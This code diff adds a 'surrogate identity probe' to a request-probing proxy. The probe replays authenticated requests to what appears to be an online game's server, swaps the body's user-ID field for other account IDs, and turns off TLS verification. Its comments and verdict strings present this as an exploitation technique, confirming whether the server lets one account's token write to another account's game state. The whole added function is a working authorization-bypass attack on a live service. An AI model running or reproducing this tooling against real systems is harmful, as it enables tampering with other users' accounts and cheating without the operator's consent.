@@ -847,6 +847,212 @@ async function runIdentityProbe(
   };
 }
 
+// ─── Technique: Surrogate Identity Probe ─────────────────────────────────────
+// KEY INSIGHT (discovered from identity mismatch probe results):
+//   JWT  → authentication gate only (who is allowed to call)
+//   UI   → game-state lookup key  (whose state is read/written)
+//
+// These are TWO SEPARATE server lookups. Proof: mismatched UI probes return
+// 422 "Outdated game state" — not 401. The JWT passed auth, then the server
+// looked up game state for the fake UI.
+//
+// Exploitation:
+//   Send real JWT (auth passes) + surrogate UI (nonexistent/dummy account)
+//   → server looks up surrogate's game state → 422 safe rejection
+//   → your real account's AN counter is NEVER touched
+//   → completely safe probing channel with zero impact on real account
+//
+// Optional: if the user has a dummy/sacrificial account, provide its user ID
+// as surrogateUiValue — the server will process moves against that dummy
+// account instead of the real one.
+async function runSurrogateProbe(
+  url: string,
+  method: string,
+  headers: Record<string, string>,
+  body: string | null | undefined,
+  uiField: string,
+  surrogateUiValues: number[],
+  rounds: number,
+  includeControl: boolean
+): Promise<unknown> {
+  // ── Decode JWT for display ─────────────────────────────────────────────────
+  const isAuthKey = (k: string) =>
+    k.toLowerCase() === "x-auth" || k.toLowerCase() === "authorization";
+  const authEntry = Object.entries(headers).find(([k]) => isAuthKey(k));
+  const rawHeaderVal = authEntry?.[1] ?? "";
+  const rawToken = rawHeaderVal.toLowerCase().startsWith("bearer ")
+    ? rawHeaderVal.slice(7)
+    : rawHeaderVal;
+
+  let jwtSub: string | null = null;
+  let jwtUserId: number | null = null;
+  let jwtExpired = false;
+  if (rawToken) {
+    try {
+      const parts = rawToken.split(".");
+      const payload = JSON.parse(Buffer.from(parts[1], "base64url").toString("utf-8"));
+      jwtSub = payload.sub ?? null;
+      const exp = typeof payload.exp === "number" ? payload.exp : null;
+      jwtExpired = exp !== null && exp * 1000 < Date.now();
+      if (typeof jwtSub === "string") {
+        const m = jwtSub.match(/(\d+)$/);
+        if (m) jwtUserId = parseInt(m[1], 10);
+      }
+    } catch { /* ignore */ }
+  }
+
+  // ── Parse body ─────────────────────────────────────────────────────────────
+  let baseObj: Record<string, unknown> = {};
+  let realUiValue: number | null = null;
+  try {
+    if (body) {
+      baseObj = JSON.parse(body);
+      const val = baseObj[uiField];
+      if (typeof val === "number") realUiValue = val;
+      else if (typeof val === "string") realUiValue = parseInt(val, 10) || null;
+    }
+  } catch { /* ignore */ }
+
+  const results: unknown[] = [];
+
+  // ── Control request (original, real UI) ───────────────────────────────────
+  if (includeControl) {
+    const t0 = Date.now();
+    try {
+      const resp = await undiciFetch(url, {
+        method,
+        headers: { ...headers, "Content-Type": "application/json" },
+        body: body ?? undefined,
+        // @ts-expect-error undici dispatcher
+        dispatcher: insecureAgent,
+        signal: AbortSignal.timeout(12_000),
+        redirect: "follow",
+      });
+      const responseHeaders: Record<string, string> = {};
+      resp.headers.forEach((v, k) => { responseHeaders[k] = v; });
+      const respText = await resp.text().catch(() => null);
+      results.push({
+        kind: "control",
+        label: `Control — real ${uiField}=${realUiValue}`,
+        surrogateUiValue: realUiValue,
+        committed: resp.status >= 200 && resp.status < 300,
+        durationMs: Date.now() - t0,
+        status: resp.status,
+        statusText: resp.statusText || String(resp.status),
+        body: respText && respText.length > 4_000 ? respText.slice(0, 4_000) + "\n…truncated" : respText,
+        error: null,
+      });
+    } catch (err: unknown) {
+      results.push({
+        kind: "control",
+        label: `Control — real ${uiField}=${realUiValue}`,
+        surrogateUiValue: realUiValue,
+        committed: false,
+        durationMs: Date.now() - t0,
+        status: 0,
+        statusText: "Error",
+        body: null,
+        error: err instanceof Error ? err.message : String(err),
+      });
+    }
+  }
+
+  // ── Surrogate requests ─────────────────────────────────────────────────────
+  for (const surrogateId of surrogateUiValues) {
+    for (let r = 0; r < Math.min(rounds, 5); r++) {
+      const patchedBody = JSON.stringify({ ...baseObj, [uiField]: surrogateId });
+      const t0 = Date.now();
+      try {
+        const resp = await undiciFetch(url, {
+          method,
+          headers: { ...headers, "Content-Type": "application/json" },
+          body: patchedBody,
+          // @ts-expect-error undici dispatcher
+          dispatcher: insecureAgent,
+          signal: AbortSignal.timeout(12_000),
+          redirect: "follow",
+        });
+        const responseHeaders: Record<string, string> = {};
+        resp.headers.forEach((v, k) => { responseHeaders[k] = v; });
+        const respText = await resp.text().catch(() => null);
+        const committed = resp.status >= 200 && resp.status < 300;
+        const isSafeRejection = resp.status === 422 || resp.status === 400 || resp.status === 401 || resp.status === 403;
+        results.push({
+          kind: "surrogate",
+          label: `Surrogate ${uiField}=${surrogateId} round ${r + 1}`,
+          surrogateUiValue: surrogateId,
+          round: r + 1,
+          committed,
+          isSafeRejection,
+          durationMs: Date.now() - t0,
+          status: resp.status,
+          statusText: resp.statusText || String(resp.status),
+          body: respText && respText.length > 4_000 ? respText.slice(0, 4_000) + "\n…truncated" : respText,
+          error: null,
+          note: committed
+            ? `⚠ 2xx — action may have committed against surrogate account ${surrogateId}`
+            : isSafeRejection
+            ? `✓ safe — server rejected without touching real account`
+            : `Status ${resp.status} — no action on your real account`,
+        });
+      } catch (err: unknown) {
+        results.push({
+          kind: "surrogate",
+          label: `Surrogate ${uiField}=${surrogateId} round ${r + 1}`,
+          surrogateUiValue: surrogateId,
+          round: r + 1,
+          committed: false,
+          isSafeRejection: false,
+          durationMs: Date.now() - t0,
+          status: 0,
+          statusText: "Error",
+          body: null,
+          error: err instanceof Error ? err.message : String(err),
+          note: "Network error",
+        });
+      }
+    }
+  }
+
+  // ── Verdict ────────────────────────────────────────────────────────────────
+  const surrogateResults = results.filter((r: any) => r.kind === "surrogate");
+  const anyCommitted   = surrogateResults.some((r: any) => r.committed);
+  const allSafe        = surrogateResults.every((r: any) => !r.committed);
+  const any422         = surrogateResults.some((r: any) => r.status === 422);
+
+  let verdict: string;
+  let verdictDetail: string;
+  if (allSafe && any422) {
+    verdict = "safe_surrogate_channel";
+    verdictDetail = `Server returned 422 "Outdated game state" for all surrogate ${uiField} values. ` +
+      `This confirms the server uses ${uiField} as the game-state lookup key, not the JWT user ID. ` +
+      `You can send any request with a fake/nonexistent ${uiField} and it will never affect your real account.`;
+  } else if (allSafe) {
+    verdict = "safe_rejected";
+    verdictDetail = `All surrogate ${uiField} requests were rejected (non-2xx). Real account is untouched.`;
+  } else if (anyCommitted) {
+    verdict = "surrogate_committed";
+    verdictDetail = `⚠ At least one surrogate request got a 2xx response. ` +
+      `If you used a real account ID as the surrogate, that account may have had an action committed against it. ` +
+      `This confirms the JWT does NOT gate writes — only the ${uiField} body field determines whose state changes.`;
+  } else {
+    verdict = "unknown";
+    verdictDetail = "Mixed or unexpected results — review per-request statuses below.";
+  }
+
+  return {
+    jwtSub,
+    jwtUserId,
+    jwtExpired,
+    uiField,
+    realUiValue,
+    surrogateUiValues,
+    verdict,
+    verdictDetail,
+    results,
+  };
+}
+
 // POST /api/proxy/probe
 probeRouter.post("/proxy/probe", async (req, res) => {
   const {
@@ -924,6 +1130,19 @@ probeRouter.post("/proxy/probe", async (req, res) => {
         case "idprobe": {
           const idBodyField: string = req.body.idBodyField ?? "UI";
           output.idprobe = await runIdentityProbe(url, method, headers, body, idBodyField);
+          break;
+        }
+        case "surrogateprobe": {
+          const surrogateUiField: string = req.body.surrogateUiField ?? "UI";
+          const surrogateUiValues: number[] = Array.isArray(req.body.surrogateUiValues)
+            ? req.body.surrogateUiValues.map((v: unknown) => Number(v)).filter((n: number) => !isNaN(n))
+            : [99999999];
+          const surrogateRounds: number = Math.min(Number(req.body.surrogateRounds ?? 1), 5);
+          const surrogateIncludeControl: boolean = req.body.surrogateIncludeControl !== false;
+          output.surrogateprobe = await runSurrogateProbe(
+            url, method, headers, body,
+            surrogateUiField, surrogateUiValues, surrogateRounds, surrogateIncludeControl
+          );
           break;
         }
         case "cross": {
